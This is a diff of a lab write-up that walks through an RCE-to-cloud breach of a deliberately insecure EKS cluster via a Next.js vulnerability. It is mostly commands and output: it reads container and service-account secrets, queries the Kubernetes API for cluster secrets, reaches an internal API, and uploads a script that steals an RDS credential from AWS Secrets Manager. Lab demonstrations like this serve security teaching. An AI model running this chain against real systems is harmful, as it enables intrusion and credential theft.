@@ -1,11 +1,11 @@
-# reat2shell: EKS Breach
+# reat2shell: Hacker Breach
 
 [Back](../README.md)
 
-- [reat2shell: EKS Breach](#reat2shell-eks-breach)
+- [reat2shell: Hacker Breach](#reat2shell-hacker-breach)
   - [Overview](#overview)
     - [Steps](#steps)
-  - [Setup EKS \& app](#setup-eks--app)
+  - [Setup Environment](#setup-environment)
   - [Code Layer - Get react runtime info](#code-layer---get-react-runtime-info)
   - [Container Layer - Get sensitive data in container](#container-layer---get-sensitive-data-in-container)
     - [Container secret \& Service account token](#container-secret--service-account-token)
@@ -41,7 +41,7 @@
 
 ---
 
-## Setup EKS & app
+## Setup Environment
 
 - Environment:
   - infra: eks-insecure
@@ -55,7 +55,7 @@ aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-insecure
 # deploy apps
 kubectl apply -f argocd/insecure-root-app.yaml
 # port forward
-kubectl port-forward service/react2shell -n react 80:80
+kubectl port-forward service/react2shell -n react 3000:3000
 
 ```
 
@@ -66,12 +66,10 @@ VICTIM_URL="http://react2shell.arguswatcher.net:3000"
 
 # try
 python scripts/rce.py $VICTIM_URL id
-# executable response:
 # uid=0(root) gid=0(root) groups=0(root)
 
 # get distro
 python scripts/rce.py $VICTIM_URL "cat /etc/os-release"
-# executable response:
 # PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
 # NAME="Debian GNU/Linux"
 # VERSION_ID="12"
@@ -83,6 +81,10 @@ python scripts/rce.py $VICTIM_URL "cat /etc/os-release"
 # BUG_REPORT_URL="https://bugs.debian.org/"
 ```
 
+![code_id](./img/hacker/code_id.png)
+
+![code_distro](./img/hacker/code_distro.png)
+
 ---
 
 ## Container Layer - Get sensitive data in container
@@ -92,32 +94,52 @@ python scripts/rce.py $VICTIM_URL "cat /etc/os-release"
 - Get container secret
 
 ```sh
-# get pod tier flag
+# print all env var
+python scripts/rce.py $VICTIM_URL "printenv"
+# KUBERNETES_SERVICE_PORT=443
+# KUBERNETES_PORT=tcp://172.20.0.1:443
+# NEXT_PRIVATE_WORKER=1
+# npm_config_user_agent=npm/10.8.2 node/v20.20.2 linux x64 workspaces/false
+# NODE_VERSION=20.20.2
+# ...
+
+# get container secret
 python scripts/rce.py $VICTIM_URL "printenv CONTAINER_SECRET"
 # CoNtAinEr-sEcRet-InsECurE
 ```
 
+- list printenv
+
+![container_printenv](./img/hacker/container_printenv.png)
+
+- retrieve **container secret**
+
+![container_secret](./img/hacker/container_secret.png)
+
+---
+
 - Get service account token
 
 ```sh
-# get
+# try service account
 python scripts/rce.py $VICTIM_URL "ls -l /var/run/secrets/kubernetes.io/serviceaccount"
-# executable response:
 # total 0
-# lrwxrwxrwx 1 root root 13 Oct  6 02:48 ca.crt -> ..data/ca.crt
-# lrwxrwxrwx 1 root root 16 Oct  6 02:48 namespace -> ..data/namespace
-# lrwxrwxrwx 1 root root 12 Oct  6 02:48 token -> ..data/token
+# lrwxrwxrwx. 1 root root 13 Oct 18 18:23 ca.crt -> ..data/ca.crt
+# lrwxrwxrwx. 1 root root 16 Oct 18 18:23 namespace -> ..data/namespace
+# lrwxrwxrwx. 1 root root 12 Oct 18 18:23 token -> ..data/token
 
-# get ns
+# get namespace
 python scripts/rce.py $VICTIM_URL "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"
-# executable response:
-# insecure
+# react
 
-# get token
+# get service account token
 python scripts/rce.py $VICTIM_URL "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
-# executable response:
 # eyJhbGciOiJSUzI1NiIsImtpZCI6ImF6c0RoVDZOX1JXS0hjXzAtYjBtbndIbHBlT1IwOE9rTzY1VDhkN1hkTWMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5l...
 ```
+
+- Get service account token
+
+![container_sa_token](./img/hacker/container_sa_token.png)
 
 ---
 
@@ -129,8 +151,7 @@ python scripts/rce.py $VICTIM_URL "curl -sS https://kubernetes.default.svc"
 # curl: (77) error setting certificate file: /etc/ssl/certs/ca-certificates.crt
 
 # request api
-python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api"
-# executable response:
+python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api'
 # {
 #   "kind": "APIVersions",
 #   "versions": [
@@ -139,25 +160,15 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
 #   "serverAddressByClientCIDRs": [
 #     {
 #       "clientCIDR": "0.0.0.0/0",
-#       "serverAddress": "172.19.0.3:6443"
+#       "serverAddress": "ip-172-16-110-140.ca-central-1.compute.internal:443"
 #     }
 #   ]
 # }
-
-# get pod
-python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
-# list all pods
-      # "metadata": {
-      #   "name": "react2shell-7cdb9b89b-zmzt9",
-      #   "namespace": "insecure",
-      # "spec": {
-      #   "serviceAccountName": "react2shell",
-      #   "serviceAccount": "react2shell",
-      #   "containers": [
-      #     {
-      #       "name": "react2shell",
-      #       "image": "docker.io/simonangelfong/react2shell:insecure",
 ```
+
+- Attemp to access apiserver
+
+![container_apiserver](./img/hacker/container_apiserver.png)
 
 ---
 
@@ -168,67 +179,70 @@ python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERV
 - Get cluster resources
 
 ```sh
-# list ns
-python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces"
-      # "metadata": {
+# list namespace
+python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces' | grep -iE "\"name\""
       #   "name": "argocd",
-      # "metadata": {
       #   "name": "default",
-      # "metadata": {
-      #   "name": "insecure",
-      # "metadata": {
+      #   "name": "internal",
+      #   "name": "kube-node-lease",
+      #   "name": "kube-public",
       #   "name": "kube-system",
-      # "metadata": {
-      #   "name": "prod",
+      #   "name": "react",
 ```
+
+---
 
 - Get cluster secret
 
 ```sh
-# list secret in pod ns
-python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/secrets"
-# executable response:
-#   "metadata": {
-#     "name": "cluster-secret",
-#     "namespace": "prod",
-#   },
-#   "data": {
-#     "password": "Y0x1U1Rlci1TZWNSZVQ="
-#   },
-#   "type": "Opaque"
-# }
+# list secret in internal namespace
+python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets' | grep -E -A1 "\"name|\"data"
+# --
+#         "name": "cluster-secret",
+#         "namespace": "internal",
+#         "uid": "c67461e6-f7c8-4975-b29d-460b83617a09",
+# --
+#       "data": {
+#         "password": "Y0x1U1Rlci1TZWNSZVQ="
+# --
+#         "name": "container-secret",
+#         "namespace": "react",
+#         "uid": "d6dd27a1-013d-45a8-9ab1-c45079b42153",
+# --
+#       "data": {
+#         "password": "Q29OdEFpbkVyLXNFY1JldC1JbnNFQ3VyRQ=="
 
 echo "Y0x1U1Rlci1TZWNSZVQ=" | base64 -d; echo
 # cLuSTer-SecReT
 ```
 
+- Get cluster secret
+
+![cluster_secret](./img/hacker/cluster_secret.png)
+
 ---
 
 ### Access internal api
 
+- An api application named `internal-api` is deployed within cluster only for internal use.
+
 ```sh
-python scripts/rce.py $VICTIM_URL "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure-backend/pods"
-      # "metadata": {
-      #   "name": "backend-api-795cdf78cd-mzg74",
-      #   "namespace": "insecure-backend",
-      # "spec": {
-      #   "containers": [
-      #     {
+# list pods in internal ns
+python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/internal/pods' | grep -E "\"name\"|\"image\"|\"containerPort\"|\"podIP\""
+      #   "name": "internal-api-66cd54c558-849t6",
       #       "name": "nginx",
-      #       "image": "nginx:latest",
-      #      "ports": [
-      #        {
-      #          "containerPort": 80,
-      #          "protocol": "TCP"
-      #  "podIP": "10.244.241.201",
+      #       "image": "nginx:alpine",
+      #           "containerPort": 3000,
+      #   "podIP": "10.0.59.72",
 
-python scripts/rce.py $VICTIM_URL "curl -fsSL http://10.244.241.201/api/v1/healthz"
-# executable response:
-# {"status":"healthy","message":"Service is running"}
-
-python scripts/rce.py $VICTIM_URL "curl -fsSL http://10.244.241.201/api/v1/users"
+# request internal api
+python scripts/rce.py $VICTIM_URL "curl -fsSL http://10.0.59.72:3000/api/v1/users"
 # [{"id":1,"name":"Alice"},{"id":2,"name":"Bob"}]
 ```
+
+- Get internal-api ip and request
+
+![cluster_internal_api](./img/hacker/cluster_internal_api.png)
 
 ---
 
@@ -239,7 +253,7 @@ python scripts/rce.py $VICTIM_URL "curl -fsSL http://10.244.241.201/api/v1/users
 # Attack
 # ##############################
 # 1. detect IRSA — pod has an AWS identity
-python3 scripts/rce.py $VICTIM_URL "env | grep AWS"
+python scripts/rce.py $VICTIM_URL "env | grep AWS"
 # AWS_ROLE_ARN=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa
 # AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
 # AWS_STS_REGIONAL_ENDPOINTS=regional
@@ -247,29 +261,43 @@ python3 scripts/rce.py $VICTIM_URL "env | grep AWS"
 # AWS_REGION=ca-central-1
 
 # get web id
-python3 scripts/rce.py $VICTIM_URL "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
+python scripts/rce.py $VICTIM_URL "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
 # eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...
 
 # try aws CLI
-python3 scripts/rce.py $VICTIM_URL "aws sts get-caller-identity"
+python scripts/rce.py $VICTIM_URL "aws sts get-caller-identity"
 # /bin/sh: 1: aws: not found
 
-# 2. upload js
+# 2. upload js script
 b64=$(base64 -w0 scripts/steal_secret.js)
-python3 scripts/rce.py $VICTIM_URL "echo $b64 | base64 -d > /tmp/s.js"
+python scripts/rce.py $VICTIM_URL "echo $b64 | base64 -d > /tmp/s.js"
 
 # 3. blast radius: the */* role lists secrets
-python3 scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
+python scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
 # [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=list
-# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606357E9,"Description":"RDS master credential (crown jewel).","LastAccessedDate":1.7921088E9,"LastChangedDate":1.792173606666E9,"Name":"react2shell-eks-insecure-rds-credential","SecretVersionsToStages":{"terraform-mb3RtAygQ7r01zMpAb4UulrH4x":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"insecure"},{"Key":"ManagedBy","Value":"terraform"}]}]}
+# [*] assumed role, akid=ASIAROFJQB4XHT4N6TE3
+# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-OpaD9C","CreatedDate":1.792346971038E9,"Description":"RDS master credential (crown jewel).","LastAccessedDate":1.7922816E9,"LastChangedDate":1.792346971319E9,"Name":"react2shell-eks-insecure-rds-credential","SecretVersionsToStages":{"terraform-vwbKvGB3G9SfIqJLZ37Dc0w8qi":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"insecure"},{"Key":"ManagedBy","Value":"terraform"}]}]}
 
 # 4. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
 # steal_secret.js:
 # read IRSA token -> STS AssumeRoleWithWebIdentity -> Secrets Manager GetSecretValue
-python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-insecure-rds-credential"
+python scripts/rce.py $VICTIM_URL "node /tmp/s.js react2shell-eks-insecure-rds-credential"
 # [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=get secret=react2shell-eks-insecure-rds-credential
-# {"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606659E9,"Name":"react2shell-eks-insecure-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-mb3RtAygQ7r01zMpAb4UulrH4x","VersionStages":["AWSCURRENT"]}
+# [*] assumed role, akid=ASIAROFJQB4XONBUMYLF
+# {"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-OpaD9C","CreatedDate":1.792346971313E9,"Name":"react2shell-eks-insecure-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-vwbKvGB3G9SfIqJLZ37Dc0w8qi","VersionStages":["AWSCURRENT"]}
 ```
+
+- Get AWS environment variables
+
+![cloud_printenv_aws](./img/hacker/cloud_printenv_aws.png)
+
+- Upload script and list AWS secrets.
+
+![cloud_upload_list_secret](./img/hacker/cloud_upload_list_secret.png)
+
+- Steal AWS RDS secret
+
+![cloud_secret](./img/hacker/cloud_secret.png)
 
 ---
 
@@ -277,7 +305,7 @@ python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /
 
 | #   | Layer     | Vulnerability             | Exploit                    |
 | --- | --------- | ------------------------- | -------------------------- |
-| 1   | code      | Next.js (CVE-2025-55182)  | escalate root shell in pod |
+| 1   | code      | Next.js (CVE-2025-55182)  | get root shell in pod      |
 | 2   | container |                           | get container secret       |
 | 3   | container | token auto-mounted in pod | access kube api with token |
 | 4   | cluster   | flat network              | access api in internal ns  |
